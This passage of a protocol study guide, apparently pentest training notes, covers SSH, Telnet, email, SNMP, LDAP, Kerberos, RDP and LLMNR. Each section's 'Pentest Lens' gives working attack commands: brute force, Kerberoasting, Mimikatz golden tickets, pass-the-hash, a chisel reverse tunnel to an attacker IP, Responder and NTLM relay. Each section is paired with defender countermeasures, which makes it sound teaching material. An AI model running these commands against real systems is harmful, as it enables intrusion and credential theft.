Port 22                          # Change to non-standard port (minor security improvement)
PermitRootLogin no               # Disable direct root SSH — critical
PasswordAuthentication no        # Force key-based auth only — critical
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
MaxAuthTries 3                   # Limit auth attempts before disconnect
LoginGraceTime 30                # Seconds before unauthenticated connection dropped
AllowUsers atharva               # Whitelist specific users
ClientAliveInterval 300          # Send keepalive every 5 min
ClientAliveCountMax 2            # Disconnect after 2 missed keepalives
X11Forwarding no                 # Disable unless needed
AllowTcpForwarding no            # Disable port forwarding unless required
```

**SSH Key Authentication**:
```bash
# Generate key pair (Ed25519 is preferred — faster, more secure than RSA)
ssh-keygen -t ed25519 -C "atharva@eurostop" -f ~/.ssh/id_ed25519

# Copy public key to server
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@192.168.1.10
# Or manually append public key to ~/.ssh/authorized_keys on the server

# Connect using specific key
ssh -i ~/.ssh/id_ed25519 user@192.168.1.10
```

**SSH Port Forwarding (Tunnelling)**:
```bash
# Local port forwarding — forward local port to remote host:port through SSH
ssh -L 8080:internal-server:80 jump-host
# Access http://localhost:8080 → reaches internal-server:80 through jump-host

# Remote port forwarding — expose local service on remote server's port
ssh -R 9090:localhost:80 remote-server
# Connections to remote-server:9090 → forwarded to localhost:80

# Dynamic port forwarding — SOCKS proxy
ssh -D 1080 jump-host
# Configure browser to use SOCKS5 proxy on localhost:1080
# All browser traffic tunnels through jump-host

# ProxyJump — multi-hop SSH
ssh -J jump01,jump02 final-target    # SSH through two jump hosts
```

**Wireshark filter**: `ssh` — note: all content is encrypted. You'll see the handshake, then encrypted data only.

### Pentest Lens — SSH

**Enumeration**:
```bash
# Banner grab — reveals SSH server software and version
nc -nv 192.168.1.10 22              # Raw TCP connection, read banner
nmap -sV -p 22 192.168.1.10         # Version detection
nmap --script ssh2-enum-algos -p 22 192.168.1.10    # Enumerate algorithms
nmap --script ssh-auth-methods -p 22 192.168.1.10   # Check auth methods allowed
nmap --script ssh-hostkey -p 22 192.168.1.10        # Get host key fingerprint
```

**Brute force**:
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10 -t 4
medusa -H hosts.txt -u root -P passwords.txt -M ssh
# Note: brute forcing SSH is slow (by design) and very noisy
```

**SSH key hunting** (post-compromise):
```bash
# Look for private keys on compromised system
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
cat ~/.ssh/known_hosts    # Reveals other SSH servers this host has connected to

# Check SSH agent (may have loaded keys)
ssh-add -l    # List keys in SSH agent

# If key found — use it
ssh -i found_key.pem user@target
```

**SSH tunnelling for pivoting** (core pentester skill):
```bash
# Scenario: Compromised bastion host. Internal network behind it.
# Create SOCKS proxy through compromised host
ssh -D 9050 -N user@bastion-host
# Configure proxychains: edit /etc/proxychains4.conf
# socks5 127.0.0.1 9050
proxychains nmap -sT -Pn 10.10.10.0/24    # Scan internal network through tunnel

# Chisel — faster, more flexible tunnelling (useful when SSH not available)
# Server (on attack box with internet access)
chisel server -p 8080 --reverse

# Client (on compromised internal host)
chisel client <attacker-IP>:8080 R:socks
# Creates SOCKS proxy accessible on attacker's box
```

**Misconfigurations**:
- Root login enabled → direct root access if credentials found
- Password authentication enabled → brute-forceable
- Weak SSH keys (RSA 1024-bit, old DSA keys)
- SSH keys with no passphrase stored in world-readable locations
- `StrictHostKeyChecking no` in SSH config → no MITM protection
- SSH allowed from all source IPs → internet-wide brute force attempts

**Defender's counter**:
- Key-based auth only, disable passwords
- Fail2ban or similar: auto-block IPs after N failed attempts
- Port knocking or port change (minor obscurity, reduces automated scanning noise)
- Restrict SSH to management VLAN / jump server source IPs via firewall
- SSH certificate authorities — more scalable than per-host `authorized_keys`

---

## 8. Telnet

### Purpose and Port
- **Port**: TCP 23
- **All data — including credentials — transmitted in cleartext**
- Legacy protocol for remote shell access, now replaced entirely by SSH
- Still found on: old network devices (switches, routers), industrial control systems, IoT devices

**Telnet interaction**:
```bash
# Connect via telnet
telnet 192.168.1.1

# Or via netcat (useful for banner grabbing any TCP service)
nc -nv 192.168.1.1 23

# Banner grab Telnet service with nmap
nmap --script telnet-ntlm-info -p 23 192.168.1.1
```

**Wireshark filter**: `telnet` — all content is in cleartext. You can Follow TCP Stream and read the entire session including credentials.

### Pentest Lens — Telnet

**Credential capture** — the primary attack:
```bash
# If MITM established: open Wireshark
# Filter: telnet
# Right-click → Follow → TCP Stream
# Entire terminal session visible in cleartext — username, password, commands typed

# Brute force
hydra -l admin -P passwords.txt telnet://192.168.1.1
```

**Misconfigurations**:
- Telnet enabled on network device alongside SSH — unnecessary attack surface
- Default credentials unchanged (`admin/admin`, `cisco/cisco`, `enable/enable`)

**Defender's counter**:
- Disable Telnet entirely: `no service telnet` on Cisco, `transport input ssh` on VTY lines
- `transport input none` on console/aux if not physically used

---

## 9. SMTP, IMAP, POP3 — Email Protocols

### SMTP — Simple Mail Transfer Protocol

SMTP handles **sending email** — from client to server, and between mail servers.

| Port | TLS | Use |
|------|-----|-----|
| 25 | None | Server-to-server (MTA to MTA) |
| 465 | Implicit TLS (SMTPS) | Client to server (legacy) |
| 587 | STARTTLS (explicit) | Client submission (modern standard) |

**SMTP Transaction — Step by Step**:
```
Client (MUA/MTA)                    Server (MTA)
  |                                      |
  |<── 220 mail.example.com ESMTP ───────|  Server greeting
  |                                      |
  |── EHLO client.domain.com ───────────>|  Client introduces itself, requests ESMTP extensions
  |<── 250-mail.example.com ─────────────|
  |<── 250-SIZE 52428800 ─────────────── |  Max message size
  |<── 250-AUTH PLAIN LOGIN ─────────────|  Supported auth methods
  |<── 250-STARTTLS ─────────────────────|  TLS upgrade available
  |<── 250 HELP ─────────────────────────|
  |                                      |
  |── STARTTLS ─────────────────────────>|  Upgrade to TLS
  |<── 220 Ready to start TLS ───────────|
  |  [TLS handshake] ← from here encrypted
  |                                      |
  |── AUTH LOGIN ────────────────────────>|
  |<── 334 Username: ────────────────────|
  |── [base64 encoded username] ─────────>|
  |<── 334 Password: ────────────────────|
  |── [base64 encoded password] ─────────>|
  |<── 235 Authentication successful ────|
  |                                      |
  |── MAIL FROM:<sender@example.com> ───>|
  |<── 250 OK ───────────────────────────|
  |── RCPT TO:<recipient@target.com> ───>|
  |<── 250 OK ───────────────────────────|
  |── DATA ──────────────────────────────>|
  |<── 354 Start mail input ─────────────|
  |── [email headers + body] ────────────>|
  |── . ─────────────────────────────────>|  Single dot on a line = end of message
  |<── 250 Message queued ───────────────|
  |── QUIT ──────────────────────────────>|
  |<── 221 Bye ──────────────────────────|
```

**SMTP user enumeration commands** (sometimes available):
- `VRFY username` — verify if user exists
- `EXPN mailinglist` — expand mailing list to member addresses
- `RCPT TO` — some servers respond differently for valid vs invalid recipients

### POP3 — Post Office Protocol v3

POP3 retrieves email from a server and **downloads it to the local client**, typically deleting from server.
- **Port**: TCP 110 (cleartext) / TCP 995 (POP3S — over TLS)

```bash
# Manual POP3 session (for testing/enumeration)
nc -nv mail.example.com 110
> USER username
> PASS password      # Cleartext!
> LIST               # List messages
> RETR 1             # Retrieve message 1
> DELE 1             # Delete message 1
> QUIT
```

### IMAP — Internet Message Access Protocol

IMAP keeps email on the server. Clients sync with the server — multiple devices see the same mailbox state.
- **Port**: TCP 143 (cleartext) / TCP 993 (IMAPS — over TLS)

```bash
# Manual IMAP session
nc -nv mail.example.com 143
> a1 LOGIN username password   # Cleartext!
> a2 LIST "" "*"               # List all mailboxes
> a3 SELECT INBOX              # Select inbox
> a4 FETCH 1 BODY[]            # Fetch message 1
> a5 LOGOUT
```

**Wireshark filters**:
```
smtp                 # All SMTP
pop                  # POP3 traffic
imap                 # IMAP traffic
```

### Pentest Lens — Email Protocols

**SMTP User Enumeration**:
```bash
# smtp-user-enum tool
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.10
smtp-user-enum -M RCPT -U users.txt -t 192.168.1.10 -D example.com

# Nmap script
nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,RCPT} -p 25 192.168.1.10

# Manual test
telnet 192.168.1.10 25
> EHLO test
> VRFY admin          # 250 = user exists, 550 = doesn't exist
```

**Open SMTP relay** — server accepts and forwards email for any domain (not just its own). Used for spam and phishing.
```bash
# Test for open relay
telnet mail.example.com 25
> EHLO attacker.com
> MAIL FROM: <spoofed@anyDomain.com>
> RCPT TO: <victim@external.com>
> DATA
> Subject: Test relay
> This is a test.
> .
# If 250 OK → open relay confirmed
```

**Email spoofing** — sending email with a forged From: address:
```bash
# sendmail (if open relay found)
sendmail -f spoofed@legitimate.com victim@target.com < email.txt

# swaks — Swiss Army Knife for SMTP testing
swaks --to victim@target.com --from ceo@target.com --server mail.target.com --data email.eml
```

**Credential brute force**:
```bash
hydra -L users.txt -P passwords.txt smtp://192.168.1.10
hydra -L users.txt -P passwords.txt imap://192.168.1.10
```

**Misconfigurations**:
- Open SMTP relay → spam/phishing abuse
- VRFY/EXPN commands enabled → user enumeration
- Port 25 accessible from internet → direct email injection to internal servers
- No SPF/DKIM/DMARC → email spoofing trivial

**Defender's counter**:
- Disable VRFY and EXPN: `smtpd_disable_vrfy_command = yes` (Postfix)
- Restrict relay: only allow authenticated users or specific IPs to relay
- SPF record: `v=spf1 include:mailprovider.com -all`
- DKIM: cryptographic signature on outgoing emails
- DMARC: policy for what to do with SPF/DKIM failures (`p=reject`)

---

## 10. SNMP — Simple Network Management Protocol

### Purpose and Ports

SNMP monitors and manages network devices — routers, switches, servers, printers. It uses a hierarchical database called the **MIB (Management Information Base)** with numeric OIDs (Object Identifiers) to identify each data point.

- **Port**: UDP 161 (agent receives requests)
- **Port**: UDP 162 (traps — agent sends alerts to manager)

**SNMP Versions**:
| Version | Auth | Privacy | Notes |
|---------|------|---------|-------|
| v1 | Community string | None | Cleartext community string, no encryption |
| v2c | Community string | None | Faster, supports 64-bit counters. Still cleartext. |
| v3 | Username/password (MD5/SHA) | DES/AES | Proper auth + encryption. Use this. |

**Community Strings** (v1/v2c): Act as a password. Default: `public` (read-only), `private` (read-write). Sent in **cleartext**.

**SNMP Operations**:
| Operation | Direction | Purpose |
|-----------|-----------|---------|
| GET | Manager → Agent | Retrieve specific OID value |
| GETNEXT | Manager → Agent | Retrieve next OID in tree |
| GETBULK | Manager → Agent | Retrieve multiple OIDs efficiently (v2+) |
| SET | Manager → Agent | Write value to OID (with write community string) |
| TRAP | Agent → Manager | Unsolicited alert (link down, temp threshold, etc.) |
| INFORM | Agent → Manager | Like TRAP but requires acknowledgment (v2+) |

**Key MIB OIDs**:
```
1.3.6.1.2.1.1.1.0     → sysDescr      (device description, OS version)
1.3.6.1.2.1.1.5.0     → sysName       (hostname)
1.3.6.1.2.1.2.2       → ifTable       (interface table — all interfaces)
1.3.6.1.2.1.4.20      → ipAddrTable   (IP addresses configured)
1.3.6.1.2.1.4.21      → ipRouteTable  (routing table)
1.3.6.1.2.1.4.22      → ipNetToMediaTable (ARP table)
1.3.6.1.2.1.6.13      → tcpConnTable  (active TCP connections)
1.3.6.1.2.1.25.6.3    → hrSWInstalledTable (installed software — Windows)
1.3.6.1.4.1.9         → Cisco enterprise MIB subtree
```

```bash
# Query SNMP device
snmpget -v2c -c public 192.168.1.1 1.3.6.1.2.1.1.1.0   # sysDescr
snmpwalk -v2c -c public 192.168.1.1                      # Walk entire MIB
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.1       # System group only

# SNMPv3 query
snmpget -v3 -u snmpuser -l authPriv -a SHA -A authPass -x AES -X privPass 192.168.1.1 sysDescr.0
```

**Wireshark filter**: `snmp` — v1/v2c community strings and all data visible in cleartext.

### Pentest Lens — SNMP

**SNMP is one of the most valuable enumeration targets in a pen test. With the right community string, you get the full device configuration, all connected hosts, running processes, and installed software — without any exploit.**

```bash
# Community string brute force
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.0/24
# Common strings to try: public, private, community, manager, admin, cisco, snmp

# Full MIB walk once community string known
snmpwalk -v2c -c public 192.168.1.1 > snmp_full_output.txt

# Specific high-value queries
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.1        # System info (hostname, OS)
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.20     # All IP addresses
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.22     # ARP table (all hosts)
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.21     # Routing table
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.6.13     # Active TCP connections
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.25.6.3   # Installed software (Windows)

# snmp-check — produces readable output
snmp-check 192.168.1.1 -c public
snmp-check 192.168.1.1 -c public -v 2c

# If read-write community string found:
# SET operations can change device configuration
snmpset -v2c -c private 192.168.1.1 sysName.0 s "hacked"
# More dangerously: change interface config, routing, disable ports
```

**NTP monlist** (related — also UDP, also amplification vector):
```bash
# NTP mode 7 monlist — returns up to 600 recent NTP clients (huge amplification)
ntpdc -c monlist 192.168.1.1
nmap --script ntp-monlist -p 123 192.168.1.1
```

**Misconfigurations**:
- Default community strings (`public`/`private`)
- SNMPv1 or v2c in use → cleartext community strings capturable on wire
- SNMP accessible from internet → full device enumeration without authentication
- Read-write community string (`private`) accessible → configuration modification

**Defender's counter**:
- Migrate to SNMPv3 with authPriv (auth + encryption)
- Change community strings from defaults, treat as passwords
- ACL to restrict SNMP to management IP only
- Block UDP 161/162 at perimeter and between segments
- Disable SNMP if not actively used for monitoring

---

## 11. NTP — Network Time Protocol

### Purpose and Port
NTP synchronises clocks across network devices. Accurate time is essential for: log correlation, Kerberos authentication (5-minute clock skew tolerance), TLS certificate validation, and forensics.

- **Port**: UDP 123
- **Stratum**: NTP hierarchy level. Stratum 0 = atomic clock/GPS. Stratum 1 = directly connected to stratum 0. Stratum 2 = synced to stratum 1. Etc.

```bash
# Query NTP server
ntpdate -q pool.ntp.org
ntpq -p                    # Show NTP peers and status

# Force sync
ntpdate pool.ntp.org       # Manual sync (deprecated, use chronyc)
chronyc makestep           # Force immediate sync with chrony

# Windows
w32tm /query /status       # Show NTP status
w32tm /resync              # Force resync
```

### Pentest Lens — NTP

**NTP monlist amplification** (covered in SNMP section — same concept).

**Time manipulation**: If you can MITM NTP or control an NTP server that a target syncs to, you can manipulate the target's time. Kerberos (5-minute tolerance) could be bypassed — though this requires very precise control and is complex to execute.

---

## 12. LDAP and LDAPS

### Purpose and Ports

LDAP (Lightweight Directory Access Protocol) is used to query and modify directory services — primarily **Active Directory** in Windows environments.

| Port | Protocol | TLS |
|------|----------|-----|
| 389 | TCP/UDP | None (LDAP) |
| 636 | TCP | TLS (LDAPS) |
| 3268 | TCP | None (Global Catalog) |
| 3269 | TCP | TLS (Global Catalog over SSL) |

**LDAP Hierarchy** (Active Directory):
```
DC=corp,DC=local                          ← Domain root
├── OU=Users                              ← Organisational Unit
│   ├── CN=John Smith                     ← User object
│   └── CN=Jane Doe
├── OU=Computers
│   ├── CN=WORKSTATION01
│   └── CN=SERVER01
└── OU=Groups
    └── CN=Domain Admins
```

**LDAP Query Syntax**:
```
(&(objectClass=user)(sAMAccountName=jsmith))    ← Find user jsmith
(objectClass=computer)                           ← All computer objects
(&(objectClass=group)(cn=Domain Admins))         ← Domain Admins group
(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)  ← Members of group
```

```bash
# Query LDAP anonymously (if allowed)
ldapsearch -x -H ldap://192.168.1.10 -b "DC=corp,DC=local"

# With credentials
ldapsearch -x -H ldap://192.168.1.10 -D "CN=jsmith,DC=corp,DC=local" \
  -w Password123 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName mail
```

### Pentest Lens — LDAP

**LDAP enumeration** is critical in Active Directory engagements — it reveals users, groups, computers, and GPO links.

```bash
# ldapdomaindump — comprehensive AD enumeration via LDAP
ldapdomaindump -u 'corp.local\jsmith' -p 'Password123' 192.168.1.10

# BloodHound ingestor (SharpHound or bloodhound-python) uses LDAP heavily
bloodhound-python -u jsmith -p Password123 -d corp.local -dc dc01.corp.local -c All

# Anonymous LDAP bind check (misconfigured AD allows this)
ldapsearch -x -H ldap://192.168.1.10 -b "" -s base namingContexts
# If returns naming contexts without credentials → anonymous bind allowed
```

**LDAP injection** (web apps that pass user input to LDAP queries without sanitisation):
```
Normal login query: (&(uid=INPUT)(password=INPUT))
Injection: uid=*)(uid=*))(|(uid=*   → bypasses auth
```

---

## 13. Kerberos — Full Ticket Flow

### Purpose and Port

Kerberos is the **default authentication protocol for Active Directory**. It provides mutual authentication — both client and server prove their identity. It uses **tickets** to avoid sending passwords over the network.

- **Port**: TCP/UDP 88
- **Components**:
  - **KDC (Key Distribution Centre)**: Runs on Domain Controllers. Contains AS (Authentication Service) and TGS (Ticket Granting Service).
  - **TGT (Ticket Granting Ticket)**: Proves the client's identity to the KDC. Obtained at login.
  - **Service Ticket (ST)**: Grants access to a specific service.

### Kerberos Authentication — Full Flow

```
Client (workstation)           KDC (Domain Controller)         Service (e.g., file server)
       |                               |                                |
       |=== Step 1: AS-REQ ═══════════>|                                |
       | "I am jsmith. Give me a TGT." |                                |
       | Contains: username, timestamp  |                                |
       | Timestamp encrypted with      |                                |
       | client's password hash (NTLM) |                                |
       |                               |                                |
       |<══ Step 2: AS-REP ════════════|                                |
       | TGT (encrypted with krbtgt    |                                |
       |   account's password hash —   |                                |
       |   client cannot read this)    |                                |
       | Session key (encrypted with   |                                |
       |   client's password hash —    |                                |
       |   client decrypts this)       |                                |
       |                               |                                |
       |=== Step 3: TGS-REQ ══════════>|                                |
       | "Give me a ticket for the     |                                |
       |  file server (CIFS/SERVER01)" |                                |
       | Contains: TGT + authenticator |                                |
       | (timestamp encrypted with     |                                |
       |  session key)                 |                                |
       |                               |                                |
       |<══ Step 4: TGS-REP ═══════════|                                |
       | Service Ticket (encrypted with |                                |
       |   service account's hash —    |                                |
       |   client cannot read this)    |                                |
       | Session key for service       |                                |
       |   (encrypted with TGT session |                                |
       |   key — client can decrypt)   |                                |
       |                               |                                |
       |=══════════ Step 5: AP-REQ ════════════════════════════════════>|
       | Service Ticket + authenticator|                                |
       | (proves identity to service)  |                                |
       |                               |                                |
       |<══════════ Step 6: AP-REP ════════════════════════════════════|
       | Service confirms identity     |                                |
       | (mutual auth — service proves |                                |
       |  it could decrypt the ticket) |                                |
       |                               |                                |
       |══════════════ Authorised Access ══════════════════════════════>|
```

**Key Security Properties**:
- Passwords never sent over the network — only hashes encrypt data
- Timestamps in authenticators prevent replay attacks (5-minute clock skew tolerance)
- KDC never sends cleartext credentials
- TGT is valid for 10 hours by default, renewable for 7 days

**SPN (Service Principal Name)**: Uniquely identifies a service instance. Format: `service/hostname:port@REALM`. Example: `HTTP/webserver.corp.local@CORP.LOCAL`

### Pentest Lens — Kerberos

Kerberos is the heart of Active Directory security — and the source of some of the most powerful AD attacks.

**AS-REP Roasting** — attack against accounts with "Do not require Kerberos pre-authentication" set:
```
Normal: Client must encrypt timestamp with password hash in AS-REQ (proves identity)
Misconfigured: Pre-auth not required → KDC sends AS-REP (containing TGT session key 
               encrypted with user's hash) to ANYONE who asks for that username
Attack: Request AS-REP for the account → offline crack the encrypted portion
```

```bash
# GetNPUsers.py (impacket) — find and exploit AS-REP roastable accounts
GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 192.168.1.10

# With credentials — enumerate which accounts have pre-auth disabled
GetNPUsers.py corp.local/jsmith:Password123 -request -format hashcat -outputfile asrep_hashes.txt -dc-ip 192.168.1.10

# Crack with hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Kerberoasting** — attack against service accounts with SPNs:
```
Step 3/4 above: Any authenticated user can request a Service Ticket for any SPN
Service Ticket encrypted with SERVICE ACCOUNT's hash
If service account has weak password → offline crack the service ticket
```

```bash
# Request Service Tickets for all SPNs and save hashes
GetUserSPNs.py corp.local/jsmith:Password123 -dc-ip 192.168.1.10 -request -outputfile kerberoast_hashes.txt

# Crack
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Pass-the-Ticket (PtT)**:
```bash
# Import stolen TGT into current session (Windows — Mimikatz)
mimikatz# kerberos::ptt ticket.kirbi

# Linux (impacket)
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass corp.local/Administrator@target.corp.local
```

**Golden Ticket** — forge TGTs using krbtgt hash (requires DA compromise):
```bash
# Mimikatz — forge TGT for any user, any group, any domain
mimikatz# lsadump::dcsync /user:krbtgt    # Get krbtgt hash
mimikatz# kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-... /krbtgt:<hash> /ticket:golden.kirbi
mimikatz# kerberos::ptt golden.kirbi
# Now have DA access to entire domain
```

**Silver Ticket** — forge Service Tickets using service account hash:
```bash
# Only grants access to the specific service — stealthier than Golden Ticket
mimikatz# kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-... /target:fileserver.corp.local /service:cifs \
  /rc4:<service-account-NTLM-hash> /ticket:silver.kirbi
```

**Misconfigurations**:
- Accounts with pre-authentication disabled (AS-REP roastable)
- Service accounts with SPNs and weak passwords (Kerberoastable)
- krbtgt password not rotated (should be rotated every 180 days)
- Delegation configured permissively (unconstrained/constrained delegation)

**Defender's counter**:
- Require pre-authentication for all accounts (default — don't disable)
- Service accounts: use gMSA (Group Managed Service Accounts) — automatic password rotation with strong random passwords, not Kerberoastable
- Monitor for: unusual TGS requests (many SPNs enumerated), RC4 downgrade in Kerberos (attacker forcing weaker encryption to crack faster)
- Rotate krbtgt password regularly (use krbtgt_UpdatePassword script)

---

## 14. RDP — Remote Desktop Protocol

### Purpose and Port

RDP provides graphical remote desktop access to Windows machines.
- **Port**: TCP 3389 (and UDP 3389 for DTLS transport in newer versions)
- **Protocol**: Microsoft proprietary, based on T.128/T.120 standards
- **Encryption**: TLS (RDP Security Layer) — older implementations used weaker RDP Security (RC4)

**RDP Connection Flow**:
```
Client → Server:
1. TCP connection to port 3389
2. X.224 Connection Request
3. MCS (Multi-Channel Structure) Connect Initial
4. TLS handshake (NLA or standard)
5. Credential negotiation (NLA: credentials verified before desktop shown)
6. TS (Terminal Services) capabilities exchange
7. Bitmap/graphics channel established
8. Desktop session begins
```

**NLA (Network Level Authentication)**: Authenticates the user **before** sending the full desktop session. Without NLA, the Windows login screen is shown before authentication — exposes the server to credential attacks against the login screen and to denial-of-service by exhausting desktop sessions.

```powershell
# Enable RDP (Windows)
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Enable NLA
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1

# Check RDP status
Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections"
```

**Wireshark filter**: `rdp` / `tls` (content is encrypted — see handshake only)

### Pentest Lens — RDP

**Enumeration**:
```bash
# Check if RDP is open
nmap -sV -p 3389 192.168.1.0/24
nmap --script rdp-enum-encryption -p 3389 192.168.1.10   # Check encryption level
nmap --script rdp-vuln-ms12-020 -p 3389 192.168.1.10     # MS12-020 DoS vuln

# Screenshot without auth (BlueKeep-adjacent — checks if NLA enforced)
rdesktop -u "" 192.168.1.10
```

**Brute force**:
```bash
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
crowbar -b rdp -s 192.168.1.10/32 -U users.txt -C passwords.txt
# Note: Account lockout often configured — be careful
```

**BlueKeep (CVE-2019-0708)** and **DejaBlue (CVE-2019-1181/1182)** — pre-auth RDP RCE vulnerabilities. Patched but still found on unpatched systems.
```bash
nmap --script rdp-vuln-ms12-020 -p 3389 192.168.1.10  # Related DoS
# BlueKeep scanner: https://github.com/robertdavidgraham/rdpscan
rdpscan 192.168.1.10
```

**Pass-the-Hash with RDP** (Restricted Admin mode):
```bash
# If target has Restricted Admin mode enabled:
xfreerdp /u:Administrator /pth:<NTLM-hash> /v:192.168.1.10 /cert-ignore
```

**RDP session hijacking** (requires SYSTEM or SeImpersonatePrivilege on the target):
```
tscon <session-ID> /dest:<current-session>
# Takes over any logged-in RDP session without credentials
# Particularly useful when domain admin left a session connected
```

**Misconfigurations**:
- RDP exposed to internet → internet-wide brute force attacks (common finding)
- NLA not enforced → pre-auth attack surface
- Old RDP protocol version (RDP Security) → weak encryption, credential extraction
- No account lockout → unlimited brute force
- RDP allowed from all source IPs

**Defender's counter**:
- Firewall: restrict RDP to management VLAN / VPN source only
- Enable NLA
- RD Gateway — expose RDP over HTTPS (port 443) with gateway authentication, not raw port 3389
- Account lockout policy
- MFA for RDP (Azure AD, Duo, etc.)
- Disable Restricted Admin mode if not needed

---

## 15. NetBIOS, LLMNR, and mDNS — Name Resolution Protocols

These three protocols are **legacy/fallback name resolution** mechanisms. They are the source of one of the most common and powerful attacks in Windows network environments.

### NetBIOS (Ports 137, 138, 139)

NetBIOS (Network Basic Input/Output System) provides name resolution, session services, and datagram services for Windows networks. Legacy — exists for backward compatibility.

| Port | Service | Protocol |
|------|---------|----------|
| 137 | NetBIOS Name Service (NBNS) | UDP |
| 138 | NetBIOS Datagram Service | UDP |
| 139 | NetBIOS Session Service | TCP |

NBT-NS (NetBIOS over TCP/IP Name Service): When a host can't resolve a name via DNS, it broadcasts a **NBNS query** to the local broadcast address asking "Who is HOST01?". Any host can respond.

### LLMNR — Link-Local Multicast Name Resolution (Port 5355)

LLMNR (RFC 4795) is a more modern fallback — uses multicast instead of broadcast. When DNS fails, Windows sends an LLMNR query to the multicast address `224.0.0.252` (IPv4) or `FF02::1:3` (IPv6).

- **Port**: UDP 5355
- **Responds to**: Hostnames that failed DNS resolution

### mDNS — Multicast DNS (Port 5353)

mDNS (RFC 6762) provides DNS-like name resolution on local networks without a DNS server. Apple's Bonjour uses mDNS. Also used by Linux Avahi.

- **Port**: UDP 5353
- **Multicast address**: `224.0.0.251`

### The Critical Attack — LLMNR/NBT-NS Poisoning

**This is one of the most reliable and impactful attacks in an internal network engagement.**

**Why it works**:
1. User on machine A types `\\FILESERVER01\share` in File Explorer
2. DNS lookup for `FILESERVER01` fails (typo, offline server, etc.)
3. Windows falls back to LLMNR — broadcasts "Who is FILESERVER01?"
4. **Attacker's machine responds**: "I am FILESERVER01"
5. Windows believes this and attempts to authenticate to the attacker
6. Windows sends the user's **Net-NTLMv2 hash** (attempt to authenticate)
7. Attacker captures the hash → offline crack, or relay to another service

**Tool: Responder**
```bash
# Responder — the primary tool for this attack
# Poisons LLMNR, NBT-NS, and mDNS simultaneously
# Runs rogue services: SMB, HTTP, FTP, LDAP, MSSQL, etc. to capture hashes

responder -I eth0 -v
# -I eth0: interface to listen on
# -v: verbose output

# Output when a hash is captured:
# [SMB] NTLMv2-SSP Client   : 192.168.1.50
# [SMB] NTLMv2-SSP Username : CORP\jsmith
# [SMB] NTLMv2-SSP Hash     : jsmith::CORP:ab12cd34ef56...:NetNTLMv2-hash-here

# Hashes saved to: /usr/share/responder/logs/
```

**Cracking captured hashes**:
```bash
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
# -m 5600 = Net-NTLMv2 hash type
# If password is in the wordlist → plaintext recovered
```

**NTLM Relay** — don't crack, just relay:
```bash
# Even without cracking, Net-NTLMv2 hashes can be relayed to other services
# (if SMB signing not enforced — common)

# Step 1: Disable SMB and HTTP in Responder (we're relaying, not capturing)
# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off

# Step 2: Run Responder for poisoning only
responder -I eth0 -v

# Step 3: Run ntlmrelayx to relay to target
ntlmrelayx.py -tf targets.txt -smb2support
# targets.txt: list of IPs to relay to (hosts where captured user has local admin)
# If relay succeeds: shell, credential dump, SAM dump depending on flags

# With -i flag: interactive SMB shell
ntlmrelayx.py -tf targets.txt -smb2support -i

# With -c flag: execute command on relayed host
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami > C:\output.txt"
```

**Wireshark filters**:
```
nbns                        # NetBIOS Name Service
llmnr                       # LLMNR queries
mdns                        # mDNS
browser                     # NetBIOS browser announcements
```

**Misconfigurations**:
- LLMNR not disabled via GPO (default: enabled)
- NBT-NS not disabled (default: enabled)
- SMB signing not enforced (allows relay — default on workstations: not enforced)
- Weak user passwords → hash cracks quickly

**Defender's counter**:
```powershell
# Disable LLMNR via GPO (preferred) or registry
# GPO: Computer Configuration → Administrative Templates → Network → DNS Client
# "Turn off multicast name resolution" → Enabled

# Registry (per machine)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" `
  -Name "EnableMulticast" -Value 0

# Disable NBT-NS:
# Network adapter → IPv4 Properties → Advanced → WINS tab
# "Disable NetBIOS over TCP/IP"
# Or via DHCP option 001 (set to 0x2 = disable NetBIOS)

# Enable SMB signing (required for relay prevention):
Set-SmbServerConfiguration -RequireSecuritySignature $true
Set-SmbClientConfiguration -RequireSecuritySignature $true
# Via GPO: Computer Config → Windows Settings → Security Settings →
# Local Policies → Security Options → "Microsoft network server: Digitally sign communications (always)"
```

---

## 16. SIP and RTP — VoIP Protocols

### SIP — Session Initiation Protocol

SIP handles **VoIP call setup, modification, and teardown**. Text-based protocol similar to HTTP.

- **Port**: UDP/TCP 5060 (cleartext), 5061 (TLS)

**SIP Methods**:
| Method | Purpose |
|--------|---------|
| INVITE | Initiate a call |
| ACK | Confirm connection |
| BYE | End a call |
| CANCEL | Cancel pending INVITE |
